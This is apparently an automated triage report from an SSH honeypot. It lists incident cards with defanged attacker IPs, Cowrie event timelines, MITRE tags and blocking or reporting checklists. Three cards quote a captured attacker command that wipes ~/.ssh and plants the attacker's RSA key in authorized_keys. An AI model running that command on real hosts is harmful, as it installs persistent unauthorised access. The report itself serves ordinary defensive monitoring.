### 🔴 HIGH · IR-f4f86ea80951

| Field | Detail |
|---|---|
| **Source IP** | `124.155.125[.]131` |
| **First Seen** | 2026-11-14 03:29 |
| **Last Seen** | 2026-11-14 03:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:29:25` | `cowrie.session.connect` |
| `2026-11-14 03:29:25` | `cowrie.client.version` |
| `2026-11-14 03:29:26` | `cowrie.client.kex` |
| `2026-11-14 03:29:26` | `cowrie.login.success` |
| `2026-11-14 03:29:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.155.125[.]131` to AbuseIPDB if not already reported
- [ ] Block `124.155.125[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-060dc67312a9

| Field | Detail |
|---|---|
| **Source IP** | `117.216.33[.]31` |
| **First Seen** | 2026-11-14 03:30 |
| **Last Seen** | 2026-11-14 03:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:30:00` | `cowrie.session.connect` |
| `2026-11-14 03:30:01` | `cowrie.client.version` |
| `2026-11-14 03:30:01` | `cowrie.client.kex` |
| `2026-11-14 03:30:03` | `cowrie.login.success` |
| `2026-11-14 03:30:04` | `cowrie.direct-tcpip.request` |
| `2026-11-14 03:30:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.216.33[.]31` to AbuseIPDB if not already reported
- [ ] Block `117.216.33[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6cb897ae07e

| Field | Detail |
|---|---|
| **Source IP** | `40.119.27[.]76` |
| **First Seen** | 2026-11-14 03:30 |
| **Last Seen** | 2026-11-14 03:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:30:15` | `cowrie.session.connect` |
| `2026-11-14 03:30:16` | `cowrie.client.version` |
| `2026-11-14 03:30:16` | `cowrie.client.kex` |
| `2026-11-14 03:30:17` | `cowrie.login.success` |
| `2026-11-14 03:30:18` | `cowrie.direct-tcpip.request` |
| `2026-11-14 03:30:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.119.27[.]76` to AbuseIPDB if not already reported
- [ ] Block `40.119.27[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b809dac3984d

| Field | Detail |
|---|---|
| **Source IP** | `163.7.9[.]55` |
| **First Seen** | 2026-11-14 03:38 |
| **Last Seen** | 2026-11-14 03:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:38:59` | `cowrie.session.connect` |
| `2026-11-14 03:38:59` | `cowrie.client.version` |
| `2026-11-14 03:38:59` | `cowrie.client.kex` |
| `2026-11-14 03:39:00` | `cowrie.login.success` |
| `2026-11-14 03:39:01` | `cowrie.session.params` |
| `2026-11-14 03:39:01` | `cowrie.command.input` |
| `2026-11-14 03:39:01` | `cowrie.command.failed` |
| `2026-11-14 03:39:02` | `cowrie.log.closed` |
| `2026-11-14 03:39:03` | `cowrie.session.params` |
| `2026-11-14 03:39:03` | `cowrie.command.input` |
| `2026-11-14 03:39:03` | `cowrie.session.file_download` |
| `2026-11-14 03:39:03` | `cowrie.log.closed` |
| `2026-11-14 03:39:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.9[.]55` to AbuseIPDB if not already reported
- [ ] Block `163.7.9[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dc79bb4203a

| Field | Detail |
|---|---|
| **Source IP** | `163.7.9[.]55` |
| **First Seen** | 2026-11-14 03:39 |
| **Last Seen** | 2026-11-14 03:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:39:03` | `cowrie.session.connect` |
| `2026-11-14 03:39:03` | `cowrie.client.version` |
| `2026-11-14 03:39:04` | `cowrie.client.kex` |
| `2026-11-14 03:39:05` | `cowrie.login.success` |
| `2026-11-14 03:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.9[.]55` to AbuseIPDB if not already reported
- [ ] Block `163.7.9[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abe10dc2fbf1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]78` |
| **First Seen** | 2026-11-14 03:41 |
| **Last Seen** | 2026-11-14 03:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:41:55` | `cowrie.session.connect` |
| `2026-11-14 03:41:55` | `cowrie.login.success` |
| `2026-11-14 03:41:56` | `cowrie.session.params` |
| `2026-11-14 03:41:56` | `cowrie.log.closed` |
| `2026-11-14 03:41:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]78` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82afd192de76

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-11-14 03:52 |
| **Last Seen** | 2026-11-14 03:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:52:10` | `cowrie.session.connect` |
| `2026-11-14 03:52:10` | `cowrie.client.version` |
| `2026-11-14 03:52:10` | `cowrie.client.kex` |
| `2026-11-14 03:52:10` | `cowrie.login.success` |
| `2026-11-14 03:52:11` | `cowrie.session.params` |
| `2026-11-14 03:52:11` | `cowrie.command.input` |
| `2026-11-14 03:52:11` | `cowrie.command.failed` |
| `2026-11-14 03:52:11` | `cowrie.log.closed` |
| `2026-11-14 03:52:11` | `cowrie.session.params` |
| `2026-11-14 03:52:11` | `cowrie.command.input` |
| `2026-11-14 03:52:11` | `cowrie.session.file_download` |
| `2026-11-14 03:52:11` | `cowrie.log.closed` |
| `2026-11-14 03:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02c171410701

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-11-14 03:52 |
| **Last Seen** | 2026-11-14 03:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:52:11` | `cowrie.session.connect` |
| `2026-11-14 03:52:11` | `cowrie.client.version` |
| `2026-11-14 03:52:11` | `cowrie.client.kex` |
| `2026-11-14 03:52:11` | `cowrie.login.success` |
| `2026-11-14 03:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b1063bc1643

| Field | Detail |
|---|---|
| **Source IP** | `154.221.25[.]205` |
| **First Seen** | 2026-11-14 03:58 |
| **Last Seen** | 2026-11-14 03:58 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:58:35` | `cowrie.session.connect` |
| `2026-11-14 03:58:35` | `cowrie.client.version` |
| `2026-11-14 03:58:35` | `cowrie.client.kex` |
| `2026-11-14 03:58:36` | `cowrie.login.success` |
| `2026-11-14 03:58:37` | `cowrie.session.params` |
| `2026-11-14 03:58:37` | `cowrie.command.input` |
| `2026-11-14 03:58:37` | `cowrie.command.failed` |
| `2026-11-14 03:58:37` | `cowrie.log.closed` |
| `2026-11-14 03:58:38` | `cowrie.session.params` |
| `2026-11-14 03:58:38` | `cowrie.command.input` |
| `2026-11-14 03:58:38` | `cowrie.session.file_download` |
| `2026-11-14 03:58:38` | `cowrie.log.closed` |
| `2026-11-14 03:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.25[.]205` to AbuseIPDB if not already reported
- [ ] Block `154.221.25[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (336) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-b0bb7b93e210 | HIGH | `154.221.25[.]205` | 2026-11-14 03:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-04449146e007 | HIGH | `59.93.105[.]215` | 2026-11-14 04:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e63fa76e4ee9 | HIGH | `43.154.195[.]142` | 2026-11-14 04:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8ca37e1d2a00 | HIGH | `43.154.195[.]142` | 2026-11-14 04:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6f2250ea55bd | HIGH | `187.126.105[.]42` | 2026-11-14 04:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1ce3f8174a45 | HIGH | `152.52.240[.]162` | 2026-11-14 04:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-95f3899a775d | HIGH | `112.186.102[.]33` | 2026-11-14 04:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7ccb6bea9d50 | HIGH | `2.55.126[.]88` | 2026-11-14 04:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3858942b0e0c | HIGH | `141.11.0[.]18` | 2026-11-14 04:14 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9223861fcb10 | HIGH | `141.11.0[.]18` | 2026-11-14 04:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0208d8e7a661 | HIGH | `77.239.124[.]252` | 2026-11-14 04:25 | Y | 0 | 0 | `T1078` |
| IR-a43a0c035847 | HIGH | `178.178.222[.]53` | 2026-11-14 04:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-64d85024d5c1 | HIGH | `173.17.162[.]121` | 2026-11-14 04:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-eaa680cc6d4d | HIGH | `50.6.204[.]157` | 2026-11-14 04:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5f96a3a52ec2 | HIGH | `50.6.204[.]157` | 2026-11-14 04:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6e5d737a2014 | HIGH | `195.178.110[.]78` | 2026-11-14 04:45 | Y | 0 | 0 | `T1078` |
| IR-e1da9f854f1f | HIGH | `35.210.70[.]211` | 2026-11-14 04:47 | Y | 3 | 0 | `T1078` |
| IR-5d0938c73632 | HIGH | `120.26.229[.]104` | 2026-11-14 04:52 | Y | 1 | 0 | `T1078 · T1592` |
| IR-d45de1281e5d | HIGH | `102.220.45[.]186` | 2026-11-14 05:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e9718ecd4674 | HIGH | `35.210.17[.]199` | 2026-11-14 05:01 | Y | 3 | 0 | `T1078` |
| IR-62a4858a3506 | HIGH | `103.159.2[.]113` | 2026-11-14 05:02 | Y | 1 | 0 | `T1078 · T1592` |
| IR-9420ede3c038 | HIGH | `176.53.159[.]196` | 2026-11-14 05:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d455dfe45bea | HIGH | `68.225.56[.]119` | 2026-11-14 05:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b7cc132dceb9 | HIGH | `13.68.214[.]34` | 2026-11-14 05:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4cf617d71f49 | HIGH | `211.216.58[.]204` | 2026-11-14 05:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1ed4ebdd6330 | HIGH | `174.67.188[.]47` | 2026-11-14 05:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fb50ce518c40 | HIGH | `138.226.239[.]233` | 2026-11-14 05:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d10e21355f42 | HIGH | `77.90.185[.]29` | 2026-11-14 05:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bc293b22e3b7 | HIGH | `36.93.154[.]207` | 2026-11-14 05:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a2c57016ae96 | HIGH | `125.130.102[.]172` | 2026-11-14 05:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8682575ce113 | HIGH | `182.93.95[.]214` | 2026-11-14 05:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3d7484ca4d1c | HIGH | `80.223.201[.]173` | 2026-11-14 05:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-265c147b328f | HIGH | `35.210.171[.]133` | 2026-11-14 05:22 | Y | 3 | 0 | `T1078` |
| IR-098b716bc77e | HIGH | `175.213.53[.]114` | 2026-11-14 05:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b2b0847efd24 | HIGH | `203.192.247[.]84` | 2026-11-14 05:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6bf4ec74453a | HIGH | `193.32.162[.]15` | 2026-11-14 05:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-188ee1994038 | HIGH | `187.8.120[.]90` | 2026-11-14 05:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dc60b8394689 | HIGH | `222.120.176[.]6` | 2026-11-14 05:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9999afb1ac6f | HIGH | `49.158.37[.]29` | 2026-11-14 05:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-64139b2c7f98 | HIGH | `183.104.220[.]152` | 2026-11-14 05:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f477e606c8b6 | HIGH | `119.152.102[.]54` | 2026-11-14 05:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-26b5d1126e4a | HIGH | `95.165.84[.]70` | 2026-11-14 05:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bbcec77f11fe | HIGH | `78.128.112[.]74` | 2026-11-14 05:49 | Y | 1 | 0 | `T1078 · T1592` |
| IR-fd96a61fa58b | HIGH | `195.178.110[.]78` | 2026-11-14 06:05 | Y | 0 | 0 | `T1078` |
| IR-c5d0f3a09f67 | HIGH | `186.96.158[.]180` | 2026-11-14 06:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a19a6d998b45 | HIGH | `186.96.158[.]180` | 2026-11-14 06:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-359bf4bb7a8e | HIGH | `59.11.206[.]167` | 2026-11-14 06:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0ae89415a457 | HIGH | `77.239.124[.]252` | 2026-11-14 06:25 | Y | 0 | 0 | `T1078` |
| IR-eacc6931a67e | HIGH | `162.4.81[.]4` | 2026-11-14 06:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9beb916ba704 | HIGH | `120.231.191[.]17` | 2026-11-14 06:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-89531c3fd3ed | HIGH | `120.231.191[.]17` | 2026-11-14 06:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dc3e5de61064 | HIGH | `211.62.73[.]218` | 2026-11-14 06:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-315e27a57b57 | HIGH | `4.240.82[.]91` | 2026-11-14 06:38 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-21837d4d1250 | HIGH | `4.240.82[.]91` | 2026-11-14 06:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-93287b9a0a4f | HIGH | `35.206.139[.]23` | 2026-11-14 06:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-738a5283f494 | HIGH | `117.247.17[.]88` | 2026-11-14 06:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-df7dcb100e98 | HIGH | `70.167.234[.]41` | 2026-11-14 06:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5b77385ce582 | HIGH | `191.210.73[.]33` | 2026-11-14 07:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a32a5d15b260 | HIGH | `76.132.238[.]43` | 2026-11-14 07:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2ea0497819f4 | HIGH | `160.119.66[.]206` | 2026-11-14 07:05 | Y | 6 | 3 | `T1059.004 · T1078 · T1105` |
| IR-d1531d011b7f | HIGH | `160.119.66[.]206` | 2026-11-14 07:05 | Y | 1 | 3 | `T1059.004 · T1078 · T1105` |
| IR-d2820d8d87e9 | HIGH | `70.183.226[.]20` | 2026-11-14 07:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-45b98de6fbec | HIGH | `49.124.155[.]189` | 2026-11-14 07:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-63466e22a92d | HIGH | `31.173.8[.]170` | 2026-11-14 07:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f29a0141328d | HIGH | `116.237.181[.]57` | 2026-11-14 07:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5c5929d18856 | HIGH | `195.23.177[.]69` | 2026-11-14 07:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c643e541e51d | HIGH | `68.58.224[.]106` | 2026-11-14 07:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-423173819956 | HIGH | `77.90.185[.]29` | 2026-11-14 07:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-72271cfb61f2 | HIGH | `138.226.239[.]233` | 2026-11-14 07:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-40ac6ae7ce1b | HIGH | `103.159.2[.]113` | 2026-11-14 07:40 | Y | 1 | 0 | `T1078 · T1592` |
| IR-9a92d96b8132 | HIGH | `43.103.44[.]227` | 2026-11-14 07:42 | Y | 1 | 0 | `T1078 · T1592` |
| IR-a06398564f13 | HIGH | `43.100.3[.]146` | 2026-11-14 07:47 | Y | 1 | 0 | `T1078 · T1592` |
| IR-4fda998ed40a | HIGH | `37.157.91[.]62` | 2026-11-14 07:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c27ac057dec5 | HIGH | `176.53.159[.]196` | 2026-11-14 07:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dd04168adb74 | HIGH | `36.64.36[.]101` | 2026-11-14 07:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6183a40a77cd | HIGH | `177.174.0[.]3` | 2026-11-14 07:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4650cd035dfc | HIGH | `40.119.27[.]76` | 2026-11-14 07:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-db8b63ae3377 | HIGH | `77.239.124[.]252` | 2026-11-14 08:06 | Y | 0 | 0 | `T1078` |
| IR-fce4d3e06cc2 | HIGH | `195.178.110[.]78` | 2026-11-14 08:21 | Y | 0 | 0 | `T1078` |
| IR-6d519580dccb | HIGH | `92.118.39[.]63` | 2026-11-14 08:23 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4416157d6f06 | HIGH | `92.118.39[.]63` | 2026-11-14 08:25 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7f3659a9b0e8 | HIGH | `92.118.39[.]63` | 2026-11-14 08:28 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1162e972bc48 | HIGH | `92.118.39[.]63` | 2026-11-14 08:33 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-cad01a1e8466 | HIGH | `92.118.39[.]63` | 2026-11-14 08:36 | Y | 27 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f571bd1b92b9 | HIGH | `92.118.39[.]63` | 2026-11-14 08:39 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-bb55aea0627e | HIGH | `92.118.39[.]63` | 2026-11-14 08:41 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-eec082b5ad77 | HIGH | `92.118.39[.]63` | 2026-11-14 08:43 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-ea9995508502 | HIGH | `92.118.39[.]63` | 2026-11-14 08:45 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-710eb7f31b85 | HIGH | `190.57.233[.]133` | 2026-11-14 08:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5affbff0edbc | HIGH | `217.211.208[.]125` | 2026-11-14 08:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8f5248dfc500 | HIGH | `92.118.39[.]63` | 2026-11-14 08:46 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7e06111cf914 | HIGH | `92.118.39[.]63` | 2026-11-14 08:48 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-720455f2a465 | HIGH | `176.53.159[.]196` | 2026-11-14 08:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5154a47add9d | HIGH | `92.118.39[.]63` | 2026-11-14 08:53 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e0e700519211 | HIGH | `92.118.39[.]63` | 2026-11-14 08:55 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3d5ec39cffce | HIGH | `92.118.39[.]63` | 2026-11-14 08:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dd757bbf5e4d | HIGH | `200.223.25[.]122` | 2026-11-14 09:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c76758585ea7 | HIGH | `92.54.116[.]227` | 2026-11-14 09:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ed589d717d32 | HIGH | `187.8.120[.]90` | 2026-11-14 09:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-68b0615c1cf1 | HIGH | `120.141.22[.]227` | 2026-11-14 09:02 | Y | 0 | 0 | `T1078 · T1592` |
_… 236 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `216.126.86[.]39` | **3** | 2026-11-14 02:57 | 2026-11-14 06:13 | 1m | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]141` | **2** | 2026-11-14 09:54 | 2026-11-14 11:17 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]38` | **2** | 2026-11-14 11:51 | 2026-11-14 12:00 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `77.239.124[.]252` | **2** | 2026-11-14 14:58 | 2026-11-14 16:19 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `92.118.39[.]14` | **2** | 2026-11-14 15:45 | 2026-11-14 16:08 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.66.165[.]103` | 1 | 2026-11-14 12:37 | 2026-11-14 12:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.159.2[.]113` | 1 | 2026-11-14 05:02 | 2026-11-14 05:02 | 1s | 0 | `T1592` | 🟢 LOW |
| `103.159.2[.]113` | 1 | 2026-11-14 07:39 | 2026-11-14 07:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.230.176[.]152` | 1 | 2026-11-14 11:37 | 2026-11-14 11:37 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `108.146.29[.]79` | 1 | 2026-11-14 08:14 | 2026-11-14 08:15 | 69s | 0 | `T1592` | 🟢 LOW |
| `109.105.209[.]12` | 1 | 2026-11-14 09:42 | 2026-11-14 09:42 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]130` | 1 | 2026-11-14 12:26 | 2026-11-14 12:26 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]35` | 1 | 2026-11-14 16:09 | 2026-11-14 16:09 | 8s | 0 | `T1592` | 🟢 LOW |
| `112.53.123[.]118` | 1 | 2026-11-14 09:35 | 2026-11-14 09:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `117.39.63[.]46` | 1 | 2026-11-14 11:14 | 2026-11-14 11:14 | 7s | 0 | `T1592` | 🟢 LOW |
| `117.50.46[.]117` | 1 | 2026-11-14 16:40 | 2026-11-14 16:42 | 120s | 0 | `T1592` | 🟢 LOW |
